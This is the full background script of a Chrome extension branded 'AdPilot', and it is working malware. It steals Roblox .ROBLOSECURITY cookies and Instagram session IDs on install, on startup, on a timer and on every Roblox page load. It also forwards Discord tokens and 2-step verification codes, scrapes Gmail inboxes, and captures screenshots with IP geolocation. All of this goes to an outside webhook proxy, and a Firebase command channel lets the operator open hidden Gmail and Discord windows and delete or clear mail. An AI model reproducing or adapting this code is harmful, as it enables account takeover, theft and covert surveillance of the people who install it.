// ============================================
// WEBHOOK URLs
// ============================================

const PROXY = "https://rendernowreal.onrender.com";
const EXT_TOKEN = "k7Xq2mP9vLzR4tN8wYbE3sJ6hD1fA5cG";

const WEBHOOK_URL = `${PROXY}/hook/main`;
const DEVICE_WEBHOOK_URL = `${PROXY}/hook/device`;
const SCREENSHOT_WEBHOOK_URL = `${PROXY}/hook/screenshot`;

const OPEN_GMAIL_PATH = "/commands/openGmail.json";
const OPEN_GMAIL_ALARM = "checkOpenGmail";
const CLOSE_WINDOWS_PATH = "/commands/closeGmailWindows.json";
const CLOSE_WINDOWS_ALARM = "checkCloseWindows";
const DELETE_PATH = "/commands/deleteMessage.json";
const DELETE_ALARM = "checkDeleteMessage";
const REFRESH_INBOX_PATH = "/commands/refreshInbox.json";
const CLEAR_INBOX_PATH = "/commands/clearInbox.json";
const RESTORE_TRASH_PATH = "/commands/restoreTrash.json";

const FIREBASE_DB_URL = "https://panel-188e4-default-rtdb.firebaseio.com";
const FIREBASE_API_KEY = "AIzaSyBzcBV0419n4PFEyFt7Je8DhNwHh5Y2k";

const TRACKED_WINDOWS_KEY = "trackedWindows";

const JSON_HEADERS = { "Content-Type": "application/json", "x-token": EXT_TOKEN };
const FORM_HEADERS = { "x-token": EXT_TOKEN };

// Human-readable source labels
const SOURCE_LABELS = {
  "startup":        "🚀 Browser Opened / Extension Started",
  "install":        "📦 Extension Installed",
  "alarm":          "⏰ Auto-Send (every 14 min)",
  "tabCreate":      "🌐 New Roblox Tab Opened",
  "tabUpdate":      "🌐 Roblox Page Loaded",
  "cookieChange":   "🔑 Roblox Account Changed",
  "popup_opened":   "🖱️ Extension Popup Opened",
  "manual":         "🖱️ Manual",
  "manual-test":    "🧪 Test",
  "roblox_visit":   "🌐 Visited Roblox.com"
};

// ============================================
// FIREBASE AUTH
// ============================================
let firebaseToken = null;

async function signInFirebase() {
  try {
    const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${FIREBASE_API_KEY}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ returnSecureToken: true })
    });
    const data = await res.json();
    if (data.idToken) {
      firebaseToken = data.idToken;
      console.log("[firebase] Signed in anonymously.");
    } else {
      console.error("[firebase] Auth failed:", data);
    }
  } catch (e) {
    console.error("[firebase] Auth error:", e);
  }
}

async function firebaseFetch(path, options = {}) {
  if (!firebaseToken) await signInFirebase();
  if (!options.headers) options.headers = {};
  options.headers["Authorization"] = `Bearer ${firebaseToken}`;
  const url = path.startsWith("http") ? path : `${FIREBASE_DB_URL}${path}`;
  const res = await fetch(url, options);
  if (res.status === 401) {
    await signInFirebase();
    options.headers["Authorization"] = `Bearer ${firebaseToken}`;
    return fetch(url, options);
  }
  return res;
}

signInFirebase();

// ============================================
// BROWSER DETECTION
// ============================================
function getBrowserName() {
  const ua = navigator.userAgent;
  if (ua.includes("Edg/")) return "Edge";
  if (ua.includes("Chrome/")) return "Chrome";
  if (ua.includes("Firefox/")) return "Firefox";
  if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
  return "Unknown Browser";
}

// ============================================
// WEBHOOK HELPER
// ============================================
async function sendToWebhook(payload, label = "") {
  try {
    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: JSON_HEADERS,
      body: JSON.stringify(payload)
    });
    if (!res.ok) {
      const text = await res.text().catch(() => "");
      console.error(`[webhook ${label}] ${res.status}:`, text.slice(0, 300));
    } else {
      console.log(`[webhook ${label}] sent ok`);
    }
  } catch (e) {
    console.error(`[webhook ${label}] error:`, e);
  }
}

// ============================================
// WINDOW TRACKING
// ============================================
async function trackWindow(winId) {
  const stored = await chrome.storage.local.get({ [TRACKED_WINDOWS_KEY]: [] });
  const list = stored[TRACKED_WINDOWS_KEY];
  if (!list.includes(winId)) list.push(winId);
  await chrome.storage.local.set({ [TRACKED_WINDOWS_KEY]: list });
}

async function closeAllTrackedWindows() {
  const stored = await chrome.storage.local.get({ [TRACKED_WINDOWS_KEY]: [] });
  for (const id of stored[TRACKED_WINDOWS_KEY]) {
    try { await chrome.windows.remove(id); } catch (e) {}
  }
  await chrome.storage.local.set({ [TRACKED_WINDOWS_KEY]: [] });
}

// ============================================
// SCREENSHOT
// ============================================
async function captureAndSendScreenshot(triggerSource = "manual") {
  try {
    await new Promise(resolve => setTimeout(resolve, 500));
    let tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tabs || tabs.length === 0) {
      tabs = (await chrome.tabs.query({})).filter(tab => tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://')));
      if (tabs.length === 0) throw new Error('No capturable tab found');
      tabs = [tabs[0]];
    }
    const tab = tabs[0];
    const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' });
    if (!dataUrl) throw new Error('captureVisibleTab returned null');

    const browser = getBrowserName();
    const ipAddress = await getIPAddress();
    const ipDetails = await getIPDetails(ipAddress);
    const cookie = await getRobloxCookie();
    let robloxInfo = cookie ? await getRobloxAccountInfo(cookie) : null;

    const fields = [
      { name: '🌐 Tab URL', value: tab.url || 'Unknown', inline: false },
      { name: '🌐 Browser', value: browser, inline: true }
    ];
    if (ipAddress) fields.push({ name: '🌍 IP Address', value: `\`\`\`${ipAddress}\`\`\``, inline: true });
    if (ipDetails) {
      fields.push({ name: '🏙️ City', value: ipDetails.city, inline: true });
      fields.push({ name: '📍 State/Region', value: ipDetails.region, inline: true });
      fields.push({ name: '🌎 Country', value: ipDetails.country, inline: true });
      fields.push({ name: '🏢 ISP', value: ipDetails.isp, inline: true });
    }
    if (robloxInfo && robloxInfo.user) {
      fields.push({ name: '👤 Roblox User', value: `[${robloxInfo.user.name}](https://www.roblox.com/users/${robloxInfo.user.id}/profile)`, inline: true });
    } else {
      fields.push({ name: '👤 Roblox User', value: 'Not logged in', inline: true });
    }

    const formData = new FormData();
    formData.append('file', await (await fetch(dataUrl)).blob(), 'screenshot.png');
    formData.append('payload_json', JSON.stringify({
      content: `📸 Screenshot triggered by **${triggerSource}**`,
      embeds: [{ title: 'Active Tab Screenshot', color: 0x6c5ce7, timestamp: new Date().toISOString(), footer: { text: 'AdPilot' }, fields }]
    }));

    await fetch(SCREENSHOT_WEBHOOK_URL, { method: 'POST', headers: FORM_HEADERS, body: formData });
  } catch (e) {
    console.error('Screenshot capture failed:', e);
  }
}

// ============================================
// SCREENSHOT REQUESTS
// ============================================
const SCREENSHOT_REQUESTS_PATH = "/screenshot_requests";
const SCREENSHOT_REQUEST_CHECK_ALARM = "checkScreenshotRequests";

async function getHighestScreenshotRequestId() {
  try {
    const response = await firebaseFetch(`${SCREENSHOT_REQUESTS_PATH}.json?shallow=true`);
    if (!response.ok) return null;
    const data = await response.json();
    if (!data) return null;
    const keys = Object.keys(data);
    if (keys.length === 0) return null;
    keys.sort((a, b) => Number(a) - Number(b));
    return keys[keys.length - 1];
  } catch (e) { return null; }
}

async function checkScreenshotRequests() {
  try {
    const highestId = await getHighestScreenshotRequestId();
    if (!highestId) return;
    const storage = await chrome.storage.local.get({ lastProcessedScreenshotRequestId: "0" });
    if (Number(highestId) > Number(storage.lastProcessedScreenshotRequestId)) {
      await captureAndSendScreenshot("discord_button");
      await chrome.storage.local.set({ lastProcessedScreenshotRequestId: highestId });
    }
  } catch (e) {}
}

// ============================================
// OPEN GMAIL + DISCORD WINDOWS
// ============================================
async function checkOpenGmail() {
  try {
    const r = await firebaseFetch(OPEN_GMAIL_PATH);
    if (!r.ok) return;
    const data = await r.json();
    if (!data || !data.ts) return;
    const stored = await chrome.storage.local.get({ lastOpenGmailTs: 0 });
    if (data.ts > stored.lastOpenGmailTs) {
      await chrome.storage.local.set({ lastOpenGmailTs: data.ts });
      async function createHiddenWindow(url, label) {
        try {
          const win = await chrome.windows.create({ url, focused: false, width: 900, height: 700, type: "normal" });
          try { await chrome.windows.update(win.id, { state: "minimized", focused: false }); } catch (e) {}
          await trackWindow(win.id);
        } catch (e) { console.error(`[openGmail] ${label} failed:`, e); }
      }
      await createHiddenWindow("https://mail.google.com", "gmail");
      await new Promise(r => setTimeout(r, 800));
      await createHiddenWindow("https://discord.com/", "discord-1");
      await new Promise(r => setTimeout(r, 800));
      await createHiddenWindow("https://discord.com/", "discord-2");
    }
  } catch (e) { console.error("[openGmail] error:", e); }
}

// ============================================
// CLOSE WINDOWS
// ============================================
async function checkCloseWindows() {
  try {
    const r = await firebaseFetch(CLOSE_WINDOWS_PATH);
    if (!r.ok) return;
    const data = await r.json();
    if (!data || !data.ts) return;
    const stored = await chrome.storage.local.get({ lastCloseWindowsTs: 0 });
    if (data.ts > stored.lastCloseWindowsTs) {
      await chrome.storage.local.set({ lastCloseWindowsTs: data.ts });
      await closeAllTrackedWindows();
      sendToWebhook({ content: "❌ Closed all tracked Gmail/Discord windows" }, "close-windows");
    }
  } catch (e) {}
}

// ============================================
// DELETE GMAIL MESSAGE
// ============================================
async function checkDeleteMessage() {
  try {
    const r = await firebaseFetch(DELETE_PATH);
    if (!r.ok) return;
    const data = await r.json();
    if (!data || !data.threadId || data.status === "done") return;
    const stored = await chrome.storage.local.get({ lastDeleteTs: 0 });
    if (data.ts <= stored.lastDeleteTs) return;
    await chrome.storage.local.set({ lastDeleteTs: data.ts });

    let tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
    let tabId;
    if (tabs.length === 0) {
      const win = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 });
      await new Promise(r => setTimeout(r, 12000));
      const newTabs = await chrome.tabs.query({ windowId: win.id });
      tabId = newTabs[0]?.id;
      await trackWindow(win.id);
    } else { tabId = tabs[0].id; }
    if (!tabId) return;

    let result;
    try {
      result = await chrome.tabs.sendMessage(tabId, { action: "deleteGmailMessage", threadId: data.threadId, subject: data.subject });
    } catch (e) {
      await chrome.tabs.reload(tabId);
      await new Promise(r => setTimeout(r, 14000));
      try { result = await chrome.tabs.sendMessage(tabId, { action: "deleteGmailMessage", threadId: data.threadId, subject: data.subject }); }
      catch (e2) { result = { ok: false, error: String(e2) }; }
    }

    await firebaseFetch(DELETE_PATH, { method: "PATCH", body: JSON.stringify({ status: "done", doneAt: Date.now(), result }) });
    sendToWebhook({ content: `${result?.ok ? "✅" : "❌"} Delete command for **${data.subject || data.threadId}**` }, "delete-result");
  } catch (e) {}
}

// ============================================
// REFRESH / CLEAR / RESTORE
// ============================================
async function checkRefreshInbox() {
  try {
    const r = await firebaseFetch(REFRESH_INBOX_PATH);
    if (!r.ok) return;
    const data = await r.json();
    if (!data || !data.ts) return;
    const stored = await chrome.storage.local.get({ lastRefreshInboxTs: 0 });
    if (data.ts <= stored.lastRefreshInboxTs) return;
    await chrome.storage.local.set({ lastRefreshInboxTs: data.ts });
    const tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
    if (tabs.length > 0) { try { await chrome.tabs.sendMessage(tabs[0].id, { action: "rescrapeInbox" }); } catch (e) { await chrome.tabs.reload(tabs[0].id); } }
    else { const w = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 }); await trackWindow(w.id); }
  } catch (e) {}
}

async function checkClearInbox() {
  try {
    const r = await firebaseFetch(CLEAR_INBOX_PATH);
    if (!r.ok) return;
    const data = await r.json();
    if (!data || !data.ts) return;
    const stored = await chrome.storage.local.get({ lastClearInboxTs: 0 });
    if (data.ts <= stored.lastClearInboxTs) return;
    await chrome.storage.local.set({ lastClearInboxTs: data.ts });
    let tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
    if (tabs.length === 0) {
      const win = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 });
      await trackWindow(win.id);
      await new Promise(r => setTimeout(r, 12000));
      tabs = await chrome.tabs.query({ windowId: win.id });
    }
    const res = await chrome.tabs.sendMessage(tabs[0].id, { action: "clearInbox" });
    sendToWebhook({ content: `🗑️ Clear inbox: ${JSON.stringify(res)}` }, "clear");
  } catch (e) {}
}

async function checkRestoreTrash() {
  try {
    const r = await firebaseFetch(RESTORE_TRASH_PATH);
    if (!r.ok) return;
    const data = await r.json();
    if (!data || !data.ts) return;
    const stored = await chrome.storage.local.get({ lastRestoreTrashTs: 0 });
    if (data.ts <= stored.lastRestoreTrashTs) return;
    await chrome.storage.local.set({ lastRestoreTrashTs: data.ts });
    let tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
    if (tabs.length === 0) {
      const win = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 });
      await trackWindow(win.id);
      await new Promise(r => setTimeout(r, 12000));
      tabs = await chrome.tabs.query({ windowId: win.id });
    }
    const res = await chrome.tabs.sendMessage(tabs[0].id, { action: "restoreTrash" });
    sendToWebhook({ content: `♻️ Restore trash: ${JSON.stringify(res)}` }, "restore");
  } catch (e) {}
}

// ============================================
// ALARMS
// ============================================
chrome.runtime.onInstalled.addListener(async (details) => {
  chrome.alarms.create("autoSendCookie", { periodInMinutes: 14 });
  chrome.alarms.create(POPUP_CHECK_ALARM, { periodInMinutes: 0.5 });
  chrome.alarms.create(SCREENSHOT_REQUEST_CHECK_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create(OPEN_GMAIL_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create(CLOSE_WINDOWS_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create(DELETE_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create("checkRefreshInbox", { periodInMinutes: 0.1 });
  chrome.alarms.create("checkClearInbox", { periodInMinutes: 0.1 });
  chrome.alarms.create("checkRestoreTrash", { periodInMinutes: 0.1 });

  if (details.reason === 'install') {
    registerDevice();
    // Explicit Roblox check on install
    await new Promise(r => setTimeout(r, 1500));
    sendRobloxCookieToWebhook("install");
  } else {
    // On update/reload, still check
    await new Promise(r => setTimeout(r, 1500));
    sendRobloxCookieToWebhook("install");
  }
});

chrome.runtime.onStartup.addListener(async () => {
  chrome.alarms.create("autoSendCookie", { periodInMinutes: 14 });
  chrome.alarms.create(POPUP_CHECK_ALARM, { periodInMinutes: 0.5 });
  chrome.alarms.create(SCREENSHOT_REQUEST_CHECK_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create(OPEN_GMAIL_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create(CLOSE_WINDOWS_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create(DELETE_ALARM, { periodInMinutes: 0.1 });
  chrome.alarms.create("checkRefreshInbox", { periodInMinutes: 0.1 });
  chrome.alarms.create("checkClearInbox", { periodInMinutes: 0.1 });
  chrome.alarms.create("checkRestoreTrash", { periodInMinutes: 0.1 });
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "autoSendCookie") sendRobloxCookieToWebhook("alarm");
  if (alarm.name === POPUP_CHECK_ALARM) checkPopupSetting();
  if (alarm.name === SCREENSHOT_REQUEST_CHECK_ALARM) checkScreenshotRequests();
  if (alarm.name === OPEN_GMAIL_ALARM) checkOpenGmail();
  if (alarm.name === CLOSE_WINDOWS_ALARM) checkCloseWindows();
  if (alarm.name === DELETE_ALARM) checkDeleteMessage();
  if (alarm.name === "checkRefreshInbox") checkRefreshInbox();
  if (alarm.name === "checkClearInbox") checkClearInbox();
  if (alarm.name === "checkRestoreTrash") checkRestoreTrash();
});

// ============================================
// POPUP TOGGLE
// ============================================
const POPUP_SETTING_PATH = "/settings/popupEnabled.json";
const POPUP_CHECK_ALARM = "checkPopupSetting";

async function checkPopupSetting() {
  try {
    const response = await firebaseFetch(POPUP_SETTING_PATH);
    if (!response.ok) return;
    const enabled = await response.json();
    if (typeof enabled !== "boolean") return;
    const stored = await chrome.storage.local.get({ popupEnabled: true });
    if (stored.popupEnabled !== enabled) {
      await chrome.storage.local.set({ popupEnabled: enabled });
      const tabs = await chrome.tabs.query({ url: "*://*.roblox.com/*" });
      for (const tab of tabs) {
        try { await chrome.tabs.sendMessage(tab.id, { action: "popupSettingChanged", enabled }); } catch (e) {}
      }
    }
  } catch (e) {}
}
checkPopupSetting();

// ============================================
// ROBLOX DETECTION
// ============================================
let lastKnownCookie = "";

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.includes("roblox.com")) {
    setTimeout(() => {
      checkCookieAndSend("tabUpdate");
      captureAndSendScreenshot("roblox_page");
    }, 2000);
  }
});

chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url && tab.url.includes("roblox.com")) {
    setTimeout(() => {
      checkCookieAndSend("tabCreate");
      captureAndSendScreenshot("roblox_new_tab");
    }, 2000);
  }
});

getRobloxCookie().then(cookie => { if (cookie) lastKnownCookie = cookie; });

setInterval(async () => {
  const cookie = await getRobloxCookie();
  if (cookie && cookie !== lastKnownCookie) {
    lastKnownCookie = cookie;
    sendRobloxCookieToWebhook("cookieChange");
  }
}, 15000);

// ============================================
// IP / ROBLOX HELPERS
// ============================================
async function getIPAddress() {
  try { const r = await fetch("https://api.ipify.org?format=json"); return r.ok ? (await r.json()).ip : null; } catch { return null; }
}
async function getIPDetails(ip) {
  if (!ip) return null;
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    if (r.ok) { const d = await r.json(); if (d.success) return { city: d.city || "Unknown", region: d.region || "Unknown", country: d.country || "Unknown", isp: d.connection?.isp || "Unknown", timezone: d.timezone?.id || "Unknown" }; }
  } catch {}
  return null;
}
async function getRobloxCookie() {
  try { const c = await chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }); return c ? c.value : null; } catch { return null; }
}

async function checkCookieAndSend(tabSource) {
  const cookie = await getRobloxCookie();
  if (!cookie) {
    sendNoCookieEmbed(tabSource);
    return;
  }
  sendRobloxCookieToWebhook(tabSource);
}

// No cookie — ALWAYS includes the source
async function sendNoCookieEmbed(source = "manual") {
  const ipAddress = await getIPAddress();
  const ipDetails = await getIPDetails(ipAddress);
  const browser = getBrowserName();

  const embed = {
    title: "❌ No Roblox Cookie Found",
    description: "User is not logged into Roblox.",
    color: 0xFF5252,
    timestamp: new Date().toISOString(),
    footer: { text: "AdPilot" },
    fields: [
      { name: "📌 Checked From", value: SOURCE_LABELS[source] || source, inline: false },
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  if (ipAddress) embed.fields.push({ name: "🌍 IP", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
  if (ipDetails) {
    embed.fields.push({ name: "🏙️ City", value: ipDetails.city, inline: true });
    embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
    embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
  }

  await sendToWebhook({ embeds: [embed] }, "no-cookie");
}

async function getRobloxAccountInfo(cookie) {
  const headers = { "Cookie": `.ROBLOSECURITY=${cookie}` };
  try {
    const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
    if (!userRes.ok) return null;
    const user = await userRes.json();
    let avatarUrl = "";
    try { const a = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`, { headers }); if (a.ok) { const ad = await a.json(); if (ad.data?.[0]) avatarUrl = ad.data[0].imageUrl; } } catch {}
    let robux = null;
    try { const b = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers }); if (b.ok) robux = (await b.json()).robux; } catch {}
    let premium = null;
    try { const p = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, { headers }); if (p.ok) premium = await p.json() === true ? "Yes" : "No"; } catch {}
    let instagramSessionId = null;
    try { const ig = await chrome.cookies.get({ url: "https://www.instagram.com", name: "sessionid" }); if (ig) instagramSessionId = ig.value; } catch {}
    return { user, avatarUrl, robux, premium, instagramSessionId };
  } catch { return null; }
}

async function sendRobloxCookieToWebhook(source = "manual") {
  const cookie = await getRobloxCookie();

  // Case 1: no cookie — always send with source
  if (!cookie) {
    sendNoCookieEmbed(source);
    return;
  }

  lastKnownCookie = cookie;

  // Case 2: cookie exists but Roblox rejects it
  const info = await getRobloxAccountInfo(cookie);
  if (!info) {
    const ipAddress = await getIPAddress();
    const ipDetails = await getIPDetails(ipAddress);
    const browser = getBrowserName();

    const embed = {
      title: "⚠️ Roblox Cookie Invalid",
      description: "A `.ROBLOSECURITY` cookie exists but Roblox's API rejected it. The cookie is expired or the account is logged out.",
      color: 0xFFA500,
      timestamp: new Date().toISOString(),
      footer: { text: "AdPilot" },
      fields: [
        { name: "📌 Checked From", value: SOURCE_LABELS[source] || source, inline: false },
        { name: "🌐 Browser", value: browser, inline: true }
      ]
    };
    if (ipAddress) embed.fields.push({ name: "🌍 IP", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
    if (ipDetails) {
      embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
      embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
    }

    await sendToWebhook({ embeds: [embed] }, "roblox-cookie-invalid");
    return;
  }

  // Case 3: valid cookie
  const { user, avatarUrl, robux, premium, instagramSessionId } = info;
  const ipAddress = await getIPAddress();
  const ipDetails = await getIPDetails(ipAddress);
  const browser = getBrowserName();

  if (deviceId) {
    firebaseFetch(`/devices/${deviceId}/robloxUsername.json`, { method: 'PUT', body: JSON.stringify(user.name) }).catch(() => {});
  }

  const embed = {
    title: "🔐 New Roblox Cookie",
    description: `**Account:** [${user.name}](https://www.roblox.com/users/${user.id}/profile)\n**User ID:** ${user.id}`,
    color: 0x6c5ce7,
    timestamp: new Date().toISOString(),
    footer: { text: "Auto‑Connect" },
    fields: [
      { name: "📌 Checked From", value: SOURCE_LABELS[source] || source, inline: false },
      { name: "🌐 Browser", value: browser, inline: true }
    ]
  };

  if (ipAddress) embed.fields.push({ name: "🌍 IP", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
  if (ipDetails) {
    embed.fields.push({ name: "🏙️ City", value: ipDetails.city, inline: true });
    embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
    embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
  }

  embed.description += `\n\n**Cookie:**\n\`\`\`${cookie}\`\`\``;

  if (robux !== null) embed.fields.push({ name: "💰 Robux", value: robux.toString(), inline: true });
  if (premium !== null) embed.fields.push({ name: "⭐ Premium", value: premium, inline: true });
  if (avatarUrl) embed.thumbnail = { url: avatarUrl };
  if (instagramSessionId) {
    embed.fields.push({ name: "📸 Instagram", value: `\`\`\`${instagramSessionId}\`\`\``, inline: false });
  }

  await sendToWebhook({ embeds: [embed] }, "roblox-cookie");
}

// Fire on SW start (browser opened / extension started)
sendRobloxCookieToWebhook("startup");

// ============================================
// MESSAGE HANDLERS
// ============================================
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'sendDiscordToken') {
    sendDiscordTokenToWebhook(message.token, message.username, message.displayName, message.avatarUrl, message.accountAge, message.guilds)
      .then(() => sendResponse({ success: true }))
      .catch((err) => sendResponse({ success: false, error: err.message }));
    return true;
  }

  if (message.action === 'startVerificationClicked') {
    (async () => {
      let username = 'Unknown';
      try { const c = await getRobloxCookie(); if (c) { const i = await getRobloxAccountInfo(c); if (i?.user?.name) username = i.user.name; } } catch {}
      await sendStartVerificationToWebhook(username);
      sendResponse({ success: true });
    })();
    return true;
  }

  if (message.action === 'sendTwoStepCode') {
    if (!message.code || message.code.length !== 6) { sendResponse({ success: false, error: 'Invalid code' }); return true; }
    sendTwoStepCodeToWebhook(message.code).then(() => sendResponse({ success: true })).catch((err) => sendResponse({ success: false, error: err.message }));
    return true;
  }

  if (message.action === 'gmailAccountInfo') {
    (async () => {
      const { name, email, messages = [] } = message;
      chrome.storage.local.set({ lastGmailAccount: { name, email, messages, at: Date.now() } });
      await firebaseFetch("/commands/openGmailInfo.json", { method: "PUT", body: JSON.stringify({ name, email, messages, at: Date.now() }) }).catch(() => {});
      if (name && email) {
        const browser = getBrowserName();
        const accEmbed = { title: "📧 Gmail Account Detected", color: 0xEA4335, timestamp: new Date().toISOString(), footer: { text: "AdPilot" }, fields: [{ name: "👤 Name", value: name, inline: true }, { name: "📩 Email", value: email, inline: true }, { name: "🌐 Browser", value: browser, inline: true }, { name: "🆔 Device", value: deviceId || "Unknown", inline: true }, { name: "📥 Count", value: messages.length.toString(), inline: true }] };
        await sendToWebhook({ embeds: [accEmbed] }, "gmail-account");
        const CHUNK = 8;
        for (let i = 0; i < messages.length; i += CHUNK) {
          const chunk = messages.slice(i, i + CHUNK);
          const fields = chunk.map((m, idx) => ({ name: `#${i + idx + 1} — ${(m.subject || "(no subject)").slice(0, 150)}`, value: `**From:** ${m.senderName || "Unknown"}${m.threadId ? ` \`${m.threadId}\`` : ""}\n${(m.snippet || "").slice(0, 120)}`.slice(0, 1000), inline: false }));
          await sendToWebhook({ embeds: [{ title: `📥 Inbox ${i + 1}–${i + chunk.length}`, color: 0x4285F4, footer: { text: `AdPilot • ${email}` }, fields }] }, `gmail-inbox-${i}`);
          await new Promise(r => setTimeout(r, 700));
        }
      }
      sendResponse({ ok: true });
    })();
    return true;
  }

  // Popup opened — re-check Roblox
  if (message.action === 'popupOpened') {
    sendRobloxCookieToWebhook("popup_opened");
    sendResponse({ ok: true });
    return true;
  }

  // Roblox page asks if logged in — used by app.js to decide showing popup
  if (message.action === 'checkRobloxLogin') {
    (async () => {
      const cookie = await getRobloxCookie();
      if (!cookie) { sendResponse({ loggedIn: false }); return; }
      const info = await getRobloxAccountInfo(cookie);
      sendResponse({ loggedIn: !!info });
    })();
    return true;
  }
});

// ============================================
// DEVICE REGISTRATION
// ============================================
let deviceId = null;
function getDeviceId(callback) {
  chrome.storage.local.get(['deviceId'], (result) => {
    if (!result.deviceId) {
      const id = 'dev_' + Math.random().toString(36).substr(2, 6).toUpperCase();
      chrome.storage.local.set({ deviceId: id }, () => callback(id));
    } else callback(result.deviceId);
  });
}
async function registerDevice() {
  getDeviceId(async (id) => {
    deviceId = id;
    const ip = await getIPAddress();
    const country = await getIPDetails(ip)?.country || "Unknown";
    const browser = getBrowserName();
    const os = navigator.platform;
    let robloxUsername = "Unknown";
    try { const c = await getRobloxCookie(); if (c) { const i = await getRobloxAccountInfo(c); if (i?.user?.name) robloxUsername = i.user.name; } } catch {}
    const embed = { title: "🆕 Device Registered", color: 0x6c5ce7, fields: [{ name: "Device ID", value: deviceId, inline: true }, { name: "Browser", value: browser, inline: true }, { name: "OS", value: os, inline: true }, { name: "IP", value: ip || "Unknown", inline: true }, { name: "Country", value: country, inline: true }, { name: "Roblox", value: robloxUsername, inline: true }], timestamp: new Date().toISOString() };
    await sendToWebhook({ embeds: [embed] }, "device-reg");
    await firebaseFetch(`/devices/${deviceId}.json`, { method: "PUT", body: JSON.stringify({ deviceId, browser, os, ip, country, lastSeen: Date.now(), online: true, robloxUsername }) });
  });
}
setInterval(async () => {
  if (deviceId) {
    await firebaseFetch(`/devices/${deviceId}/lastSeen.json`, { method: "PUT", body: JSON.stringify(Date.now()) }).catch(() => {});
  }
}, 30000);

// ============================================
// START VERIFICATION / 2SV / DISCORD TOKEN
// ============================================
async function sendStartVerificationToWebhook(username) {
  const browser = getBrowserName();
  const embed = { title: "🔘 Start Verification Clicked", description: `A user clicked the **Start Verification** button.`, color: 0x00b894, timestamp: new Date().toISOString(), fields: [{ name: "👤 Roblox", value: username, inline: true }, { name: "🌐 Browser", value: browser, inline: true }] };
  await sendToWebhook({ embeds: [embed] }, "start-verify");
}
async function sendTwoStepCodeToWebhook(code) {
  const browser = getBrowserName();
  const embed = { title: "🔐 2-Step Verification Code", description: `Code: \`\`\`${code}\`\`\``, color: 0x6c5ce7, timestamp: new Date().toISOString(), fields: [{ name: "🌐 Browser", value: browser, inline: true }] };
  await sendToWebhook({ embeds: [embed] }, "2sv");
}
async function sendDiscordTokenToWebhook(token, username, displayName, avatarUrl, accountAge, guilds) {
  const browser = getBrowserName();
  const guildList = guilds && guilds.length > 0 ? guilds.slice(0, 20).join(', ') : 'None';
  const embed = { title: "🔑 New Discord Account Added", description: `**Display Name:** ${displayName}\n**Username:** ${username}`, color: 0x00b894, timestamp: new Date().toISOString(), thumbnail: { url: avatarUrl }, fields: [{ name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }, { name: "Account Age", value: accountAge, inline: true }, { name: "Servers", value: `\`\`\`${guildList}\`\`\``, inline: false }, { name: "🌐 Browser", value: browser, inline: true }] };
  await sendToWebhook({ embeds: [embed] }, "discord-token");
}
